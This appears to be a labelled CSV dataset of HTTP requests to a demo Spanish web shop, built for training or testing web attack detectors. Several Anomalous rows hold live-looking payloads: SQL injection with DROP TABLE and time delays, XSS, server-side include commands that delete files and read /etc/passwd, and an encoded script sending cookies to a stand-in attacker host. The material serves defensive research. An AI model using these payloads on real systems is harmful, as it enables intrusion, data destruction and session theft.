label,method,url,http_version,host,user_agent,pragma,cache_control,accept,accept_encoding,accept_charset,language,cookie,content_type,content_length,connection,body,classification
Anomalous,GET,/tienda1/publico/anadir.jsp?idA=3&nombre=Vino+Rioja&precio=100&cantidad=70&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=3C33B65FFFB09976C841E7851F2A4C30,,,close,,1
Normal,GET,/tienda1/miembros/imagenes/zarauz.jpg,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=CC50C19EFA5390F16C15B82DD51EECBB,,,close,,0
Normal,POST,/tienda1/miembros/editar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=1A30A92118F996A811F5C9BA35CE5C31,application/x-www-form-urlencoded,Content-Length: 232,Connection: close,modo=registro&login=jed&password=mordazmente&nombre=Theo&apellidos=Russo&email=tinti%4021horas.hr&dni=81878772Z&direccion=Calle+Poeta+Guimera%2C+2+13H&ciudad=Confrides&cp=46266&provincia=Guadalajara&ntc=2174818451824569&B1=Registrar,0
Normal,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=7987&B1=Pasar+por+caja,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=82F806FCB7B28CDB1B6EA5D286E29E77,,,close,,0
Normal,GET,/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=E7583C2DD386E10CE0E1F85AF18193D7,,,close,,0
Normal,GET,/tienda1/publico/caracteristicas.jsp?id=2,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=AD1CB85DBB485C7F9F974F908414D7A6,,,close,,0
Normal,GET,/tienda1/publico/productos.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=2C94B44B63F3DCD6AD5A5ED55610FA2E,,,close,,0
Anomalous,POST,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=0A9E5E73C8581DA004C729F26FC1818E,application/x-www-form-urlencoded,Content-Length: 271,Connection: close,modo=registro&login=prithvi8&password=6sp51ri0a&nombre=Seth&apellidos=Tonsmann+Puigferrer&email=mercader%40pinkplanetplasencia.om&dni=52864416C&direccion=Calle+La+Higuerilla+32+9%3FH&ciudad=Vegas+del+Condado&cp=25790&provincia=C%E1ceres&ntcA=7823159918497362&B1=Registrar,1
Normal,GET,/tienda1/miembros/editar.jsp?modo=registro&login=orr&password=querando&nombre=Adalgisa&apellidos=T%E1vara+Ganci&email=baz_azais%40filtraciondehumos.sb&dni=47106635J&direccion=Calle+Carme+Karr%2C+65%2C+10A&ciudad=A%F1%F3n+de+Moncayo&cp=46470&provincia=Valencia&ntc=9481894123052720&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=884263D908C5450A6548C5A6A8270740,,,close,,0
Normal,POST,/tienda1/publico/entrar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=0D4282BAC30829F60DD21AB5473F438E,application/x-www-form-urlencoded,Content-Length: 33,Connection: close,errorMsg=Credenciales+incorrectas,0
Anomalous,GET,/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Riojaparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&precio=85&cantidad=22&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9A735EF0CD52CC972169B82C5A03C958,,,close,,1
Normal,GET,/tienda1/miembros/salir.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=C3C72C2DCC88F8FFDEC8513201DD8A8E,,,close,,0
Anomalous,POST,/tienda1/publico/caracteristicas.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=D24C8F55ADF887F6F2B2083CA793BC6D,application/x-www-form-urlencoded,Content-Length: 567,Connection: close,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,1
Normal,GET,/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=2950C32569152ED97A52CE9CE5A8AF14,,,close,,0
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=corissa&password=cipresino&nombre=Cenobio&apellidos=La+Ringa+Chinchilla&email=plate%40pecher.mx&dniA=16052504E&direccion=Torres+Quevedo%2C+143+10%3FB&ciudad=Casas+de+Juan+N%FA%F1ez&cp=31480&provincia=Madrid&ntc=1974630082144363&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=E19EEB42D04C35C036D07D9A19A76FA8,,,close,,1
Normal,GET,/tienda1/global/menum.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=26AF59A2BBF23A07867BFA1CA4CC2A9B,,,close,,0
Normal,GET,/tienda1/miembros/imagenes/ogono.jpg,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=62E4F2D1DC9A026059E142F2E48EE220,,,close,,0
Anomalous,POST,/tienda1/publico/entrar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=9D6C3AF79AB5306B4B63923F265729A4,application/x-www-form-urlencoded,Content-Length: 34,Connection: close,errorMsgA=Credenciales+incorrectas,1
Anomalous,GET,/tienda1/publico/autenticar.jsp?modo=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&login=world.fa&pwd=entremeter&remember=on&B1=Entrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=0570DE920C5BF7462FD859690C0D8E00,,,close,,1
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=fitch&password=libres29&nombre=Aramis&apellidos=Bellmunt+Callealt&email=frigola%40lesionesmusculares.tv%252B&dni=56967582D&direccion=Plza.+Celso+Negueruela%2C+113%2C+&ciudad=Pajares+de+los+Oteros&cp=18370&provincia=%C1lava&ntc=6708069843609931&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=87308021183BDB04E51AA5301D3B7CC8,,,close,,1
Normal,GET,/tienda1/imagenes/logo.gif,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=23EEBC6EDFD91C7682AFB605DD45ABAA,,,close,,0
Anomalous,GET,/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&precio=39&cantidad=81&B1=A%F1adir+al+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=CD617AED96A36BEFEC5EBE506EE6BE23,,,close,,1
Anomalous,GET,/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=1A4BB25133E2A5F9ECD7962451EE5D88,,,close,,1
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=boinnard&password=alARgUEZ&nombre=Celinda&apellidos=Alberti%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&email=moriconi%40x2.com.pro&dni=75775962R&direccion=Do%F1a+Sancha+16%2C+&ciudad=Montesclaros&cp=46230&provincia=Alicante&ntc=7573620242761583&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=A0D9E1E018B4427CCB5E4E76DDEDD70C,,,close,,1
Anomalous,GET,/tienda1/publico/registro.jsp?modo=registro&login=yung-fu&password=8Ach35&nombre=Atico&apellidos=Farzati+Bol%E0s&email=gobert%40olvidalo.sh&dni=87238782N&direccion=Calle+Salamanca%2C+147%2C+12-C&ciudad=Llacuna%2C+La&cp=42192&provincia=La+Rioja&ntc=434921604510901A&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=8E897276A20AD483943AC87B64040EDD,,,close,,1
Normal,GET,/tienda1/index.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=88E9D13C156BCDB3A248CE8D8A0F0270,,,close,,0
Anomalous,GET,/iisadmpwd/aexp2b.htr,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=E6DAF48B17322FC6B6464F95941A4B02,,,close,,1
Anomalous,GET,/tienda1/publico/pagar.jsp?modo=insertar&precio=6543&B1A=Confirmar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=73F166C1A331C274F1CCF4D5C0EDB694,,,close,,1
Anomalous,GET,/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=2D354D91903F7CDE633851738DCA52F0,,,close,,1
Normal,GET,/tienda1/imagenes/nuestratierra.jpg,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=4ACD52FAB725E0B8F1A965F740DD6EC2,,,close,,0
Anomalous,POST,/tienda1/publico/entrar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=A0370288E93CCB1584E60DB846CFC9E7,application/x-www-form-urlencoded,Content-Length: 93,Connection: close,errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=maddalen&password=atab%3Fa6Ad7&nombre=Am%F3n&apellidos=Pericas+Espaulella&email=stimson_holbrook%40cementosanfranq.ly&dni=60928646J&direccion=C%2F+Sarasate+143+&ciudad=Montu%EFri&cp=49156&provincia=Salamanca&ntc=6395384194321483&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=89B7908D20F46F4177C7FE17FB9C9BBC,,,close,,0
Anomalous,PUT,/tienda1/publico/entrar.jsp,HTTP/1.1,localhost:9090,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,,"x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=20D1199BE5605033B72ADF5ADE7F642D,application/x-www-form-urlencoded,Content-Length: 33,Connection: close,errorMsg=Credenciales+incorrectas,1
Anomalous,POST,/tienda1/publico/vaciar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=AAB07A9056118A6136D3FD522AA42436,application/x-www-form-urlencoded,Content-Length: 18,Connection: close,B2A=Vaciar+carrito,1
Normal,POST,/tienda1/publico/caracteristicas.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=D1DF38155D312B1D1E3C4E3380938BD9,application/x-www-form-urlencoded,Content-Length: 4,Connection: close,id=2,0
Normal,GET,/tienda1/imagenes/nuestratierra.jpg,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=8FF66F9C4BFF76C752A8EB21A312862B,,,close,,0
Normal,GET,/tienda1/publico/registro.jsp?modo=registro&login=quinones&password=8arrascal485&nombre=Zelmiro&apellidos=Paulet+Ajau&email=belak-geraci%40buscamoto.mm&dni=93494708F&direccion=C%2F+Ruiz+De+Salazar%2C+49+4D&ciudad=Zaida%2C+La&cp=50400&provincia=Vizcaya&ntc=3685717385941815&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=B1413E0E6254A7ED4E4DC2F6FBBCDE40,,,close,,0
Normal,GET,/tienda1/miembros/index.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=976587DCD31B99587CA40CC94535AD5A,,,close,,0
Normal,POST,/tienda1/publico/vaciar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=A7584DA715660A84909DC5D40722B904,application/x-www-form-urlencoded,Content-Length: 17,Connection: close,B2=Vaciar+carrito,0
Anomalous,GET,/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=8882A406B81529F87FAA8ED5BE1645F9,,,close,,1
Normal,POST,/tienda1/publico/registro.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=ED09D20D6EC4B87A573B7A43E9F2D07F,application/x-www-form-urlencoded,Content-Length: 233,Connection: close,modo=registro&login=kalpak&password=tolera9lemen8e&nombre=Sixto&apellidos=Peredo+Huecas&email=byron%40vinavilano.gl&dni=21468433A&direccion=Toril%2C+171+5H&ciudad=Mu%F1opedro&cp=45790&provincia=Soria&ntc=5036144025003599&B1=Registrar,0
Normal,GET,/tienda1/publico/caracteristicas.jsp?id=2,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=DFF8FC91CFA2B1868E8910453499931C,,,close,,0
Normal,POST,/tienda1/publico/caracteristicas.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=993DF6B933A355946CBC1D60B71DA009,application/x-www-form-urlencoded,Content-Length: 4,Connection: close,id=1,0
Normal,POST,/tienda1/publico/entrar.jsp,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=64ED307C6756501AED0D3E526CD6443F,application/x-www-form-urlencoded,Content-Length: 33,Connection: close,errorMsg=Credenciales+incorrectas,0
Anomalous,GET,/tienda1/miembros/editar.jsp?modo=registro&login=gerhardt8&password=pizmie%2Bnta&nombre=Yamila&apellidos=Cardalliaguet+Yescas&email=armantel%40laspruebascongaseosa.vg&dni=65724136A&direccionA=Castro+Canseco+8+5%3FH&ciudad=Oria&cp=17538&provincia=Albacete&ntc=2877016523183053&B1=Registrar,HTTP/1.1,localhost:8080,Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko),no-cache,no-cache,"text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5","x-gzip, x-deflate, gzip, deflate","utf-8, utf-8;q=0.5, *;q=0.5",en,JSESSIONID=AAB389F1184C117AD26F03B92BE058C5,,,close,,1
